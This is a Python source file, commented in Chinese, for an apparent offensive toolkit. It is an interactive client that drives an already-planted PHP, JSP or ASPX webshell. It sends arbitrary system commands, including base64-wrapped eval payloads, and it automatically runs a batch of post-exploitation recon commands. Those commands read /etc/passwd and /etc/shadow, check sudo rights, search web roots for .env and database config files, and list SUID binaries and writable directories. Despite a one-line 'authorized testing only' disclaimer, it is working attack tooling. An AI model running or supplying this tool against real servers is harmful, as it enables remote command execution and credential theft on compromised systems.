#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
webshell.py - 通用Webshell交互式连接工具 v1.0
功能：
  1. 支持PHP/JSP/ASPX webshell连接
  2. 交互式命令执行
  3. 批量命令执行（信息收集一键执行）
  4. 文件上传/下载功能基础框架
⚠️ 仅用于授权安全测试
"""

import os
import sys
import re
import json
import base64
import datetime
import readline
from urllib.parse import urljoin

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from core.session import create_secure_session
from utils import Colors

# ==================== 工具接口变量 ====================
TOOL_NAME = "Webshell交互终端"
TOOL_ID = "webshell"
TOOL_DESC = "连接已获取的webshell，提供交互式命令执行和批量信息收集"
TOOL_CATEGORY = "exploit"
TOOL_PRIORITY = 10

TIMEOUT = 15

# 一键信息收集命令
INFO_GATHER_COMMANDS = [
    ("系统基本信息", "id; whoami; hostname; uname -a; cat /etc/os-release 2>/dev/null || cat /etc/issue; uptime"),
    ("网络信息", "ip addr || ifconfig; ip route || route -n; cat /etc/resolv.conf; netstat -tulnp 2>/dev/null || ss -tulnp"),
    ("用户与权限", "cat /etc/passwd; cat /etc/shadow 2>/dev/null; sudo -l 2>/dev/null; who; w; last | head -20"),
    ("环境变量", "env; pwd; echo \$PATH"),
    ("进程与服务", "ps auxf 2>/dev/null || ps -ef; systemctl list-units --type=service --state=running 2>/dev/null"),
    ("敏感文件扫描", "ls -la /root/ 2>/dev/null; ls -la /home/; cat /etc/passwd | grep -v nologin | grep -v false"),
    ("容器/虚拟化检测", "cat /proc/1/cgroup 2>/dev/null; ls -la /.dockerenv 2>/dev/null; cat /proc/version"),
    ("数据库配置搜索", "find /var/www -name 'config.php' -o -name '.env' -o -name 'database.php' 2>/dev/null | head -20"),
    ("SUID权限文件", "find / -perm -u=s -type f 2>/dev/null | head -20"),
    ("可写目录", "find /tmp /var/tmp /dev/shm -writable -type d 2>/dev/null"),
]

class Logger:
    def info(self, msg): print(f"{Colors.BLUE}[INFO] {msg}{Colors.RESET}")
    def success(self, msg): print(f"{Colors.GREEN}[+] {msg}{Colors.RESET}")
    def warning(self, msg): print(f"{Colors.YELLOW}[!] {msg}{Colors.RESET}")
    def error(self, msg): print(f"{Colors.RED}[-] {msg}{Colors.RESET}")
    def exploit(self, msg): print(f"{Colors.MAGENTA}[⚡] {msg}{Colors.RESET}")
    def raw(self, msg): print(msg)

logger = Logger()


class WebShellClient:
    """Webshell客户端"""
    
    def __init__(self, url, pwd="cmd", shell_type="php", proxy=None):
        self.url = url
        self.pwd = pwd
        self.shell_type = shell_type.lower()
        self.session = create_secure_session(verify_ssl=False, timeout=TIMEOUT)
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
    
    def exec_cmd(self, cmd):
        """执行命令"""
        try:
            if self.shell_type == "php":
                data = {self.pwd: f"system('{cmd}');"}
                resp = self.session.post(self.url, data=data, timeout=TIMEOUT)
            elif self.shell_type == "php_eval":
                data = {self.pwd: cmd}
                resp = self.session.post(self.url, data=data, timeout=TIMEOUT)
            elif self.shell_type == "jsp":
                data = {self.pwd: cmd}
                resp = self.session.post(self.url, data=data, timeout=TIMEOUT)
            elif self.shell_type == "aspx":
                data = {self.pwd: cmd}
                resp = self.session.post(self.url, data=data, timeout=TIMEOUT)
            else:
                resp = self.session.post(self.url, data={self.pwd: cmd}, timeout=TIMEOUT)
            
            if resp and resp.status_code == 200:
                return resp.text
            return f"[HTTP Error: {resp.status_code if resp else 'No Response'}]"
        except Exception as e:
            return f"[Error: {str(e)}]"
    
    def exec_cmd_base64(self, cmd):
        """base64编码执行避免特殊字符问题"""
        if self.shell_type == "php":
            b64_cmd = base64.b64encode(cmd.encode()).decode()
            payload = f"eval(base64_decode('{b64_cmd}'));"
            data = {self.pwd: payload}
        else:
            data = {self.pwd: cmd}
        
        try:
            resp = self.session.post(self.url, data=data, timeout=TIMEOUT)
            return resp.text if resp else ""
        except Exception as e:
            return str(e)
    
    def test_connection(self):
        """测试webshell是否可用"""
        test_cmds = [
            ("echo 'SHELL_TEST_BEE_PY_OK';id", "SHELL_TEST_BEE_PY_OK"),
            ("echo 'SHELL_TEST_2';whoami", "SHELL_TEST_2"),
            ("printf 'SHELL_TEST_3'", "SHELL_TEST_3"),
        ]
        
        for cmd, marker in test_cmds:
            output = self.exec_cmd(cmd)
            if marker in output:
                return True, output
        return False, ""


def interactive_shell(client):
    """交互式shell"""
    print(f"\n{Colors.MAGENTA}[*] 进入交互模式，输入命令执行，输入 help 查看帮助，exit 退出{Colors.RESET}")
    print(f"{Colors.MAGENTA}{'='*60}{Colors.RESET}")
    
    while True:
        try:
            cmd = input(f"{Colors.RED}bee-shell> {Colors.RESET}").strip()
            if not cmd:
                continue
            
            if cmd.lower() in ["exit", "quit", "q"]:
                print("[*] 退出webshell")
                break
            elif cmd.lower() in ["help", "h", "?"]:
                print(f"""{Colors.CYAN}
可用命令:
  help              显示帮助
  info              执行一键信息收集（全部预定义命令）
  info <编号>       执行指定编号的信息收集命令
  list              列出所有信息收集命令
  cd <目录>         切换目录 (仅当前会话)
  clear / cls       清屏
  exit / quit / q   退出
  <任意系统命令>     执行系统命令
{Colors.RESET}""")
                continue
            elif cmd.lower() in ["clear", "cls"]:
                os.system('clear' if sys.platform != 'win32' else 'cls')
                continue
            elif cmd.lower() == "list":
                print(f"{Colors.CYAN}信息收集命令列表:{Colors.RESET}")
                for i, (name, _) in enumerate(INFO_GATHER_COMMANDS):
                    print(f"  {i+1}. {name}")
                continue
            elif cmd.lower() == "info":
                print(f"{Colors.YELLOW}[*] 开始一键信息收集...{Colors.RESET}\n")
                for name, c in INFO_GATHER_COMMANDS:
                    print(f"{Colors.CYAN}{'='*40}{Colors.RESET}")
                    print(f"{Colors.GREEN}[+] {name}{Colors.RESET}")
                    print(f"{Colors.CYAN}{'='*40}{Colors.RESET}")
                    output = client.exec_cmd(c)
                    clean = re.split(r'(SHELL_TEST_BEE_PY_OK|Array|string\(\d+\))', output)[0].strip()
                    print(clean[:5000] if clean else output[:2000])
                    print()
                continue
            elif cmd.lower().startswith("info "):
                try:
                    idx = int(cmd.split()[1]) - 1
                    if 0 <= idx < len(INFO_GATHER_COMMANDS):
                        name, c = INFO_GATHER_COMMANDS[idx]
                        print(f"{Colors.GREEN}[+] {name}{Colors.RESET}")
                        output = client.exec_cmd(c)
                        clean = output.split("SHELL_TEST_BEE_PY_OK")[0].strip()
                        print(clean)
                    else:
                        print("无效的命令编号")
                except Exception as e:
                    print(f"参数错误: {e}")
                continue
            else:
                output = client.exec_cmd(cmd)
                clean = output
                if "SHELL_TEST_BEE_PY_OK" in clean:
                    clean = clean.split("SHELL_TEST_BEE_PY_OK")[0]
                elif "Array" in clean[:100]:
                    clean = clean.split("Array")[0]
                print(clean.rstrip())
                
        except KeyboardInterrupt:
            print("\n[*] Ctrl+C，输入exit退出")
        except EOFError:
            break


def run_batch_commands(client, commands):
    """批量执行命令"""
    results = {}
    for name, cmd in commands:
        logger.info(f"执行: {name}")
        output = client.exec_cmd(cmd)
        results[name] = output[:3000]
    return results


# ==================== 工具入口函数 ====================
def execute(scan_result, target_info, config=None):
    """
    WebShell连接入口（通常由其他exploit工具上传shell后调用，或手动指定URL）
    """
    config = config or {}
    base_url = target_info.get("base_url", "")
    domain = target_info.get("domain", "")
    
    shell_url = config.get("shell_url")
    if not shell_url and config.get("shells"):
        shells = config.get("shells", [])
        if shells:
            shell_url = shells[0].get("shell_url")
    
    if not shell_url:
        return {
            "tool": TOOL_ID,
            "target": domain,
            "status": "skipped",
            "summary": "未提供webshell地址，跳过交互shell"
        }
    
    pwd = config.get("password", "cmd")
    shell_type = config.get("shell_type", "php")
    
    logger.info(f"=== Webshell连接 ===")
    logger.info(f"URL: {shell_url}")
    logger.info(f"密码参数: {pwd}")
    logger.info(f"类型: {shell_type}")
    
    client = WebShellClient(shell_url, pwd=pwd, shell_type=shell_type)
    ok, test_output = client.test_connection()
    
    result = {
        "tool": TOOL_ID,
        "target": domain,
        "url": shell_url,
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "connected": ok,
        "info_gather": {},
    }
    
    if ok:
        logger.success("Webshell连接成功!")
        logger.raw(test_output[:500])
        
        if config.get("auto_info_gather", True):
            logger.info("开始自动信息收集...")
            result["info_gather"] = run_batch_commands(client, INFO_GATHER_COMMANDS[:5])
        
        if config.get("interactive", False) and sys.stdin.isatty():
            interactive_shell(client)
    else:
        logger.error("Webshell连接失败")
        result["summary"] = "Webshell连接测试失败"
    
    return result


if __name__ == "__main__":
    print(f"{Colors.CYAN}Bee-Webshell v1.0 交互式终端{Colors.RESET}")
    print("=" * 60)
    
    if len(sys.argv) < 2:
        print("用法: python webshell.py <shell_url> [--pwd cmd] [--type php|jsp|aspx] [--batch]")
        print("示例: python webshell.py http://example.com/shell.php --pwd cmd")
        print("示例: python webshell.py http://example.com/shell.php --batch (自动信息收集不交互)")
        sys.exit(0)
    
    shell_url = sys.argv[1]
    pwd = "cmd"
    shell_type = "php"
    interactive = "--batch" not in sys.argv
    
    if "--pwd" in sys.argv:
        idx = sys.argv.index("--pwd")
        if idx + 1 < len(sys.argv):
            pwd = sys.argv[idx + 1]
    if "--type" in sys.argv:
        idx = sys.argv.index("--type")
        if idx + 1 < len(sys.argv):
            shell_type = sys.argv[idx + 1]
    
    from urllib.parse import urlparse
    parsed = urlparse(shell_url)
    domain = parsed.netloc
    target_info = {"domain": domain, "base_url": f"{parsed.scheme}://{domain}/"}
    scan_result = {"ports": []}
    config = {
        "shell_url": shell_url,
        "password": pwd,
        "shell_type": shell_type,
        "interactive": interactive,
        "auto_info_gather": True,
    }
    
    execute(scan_result, target_info, config)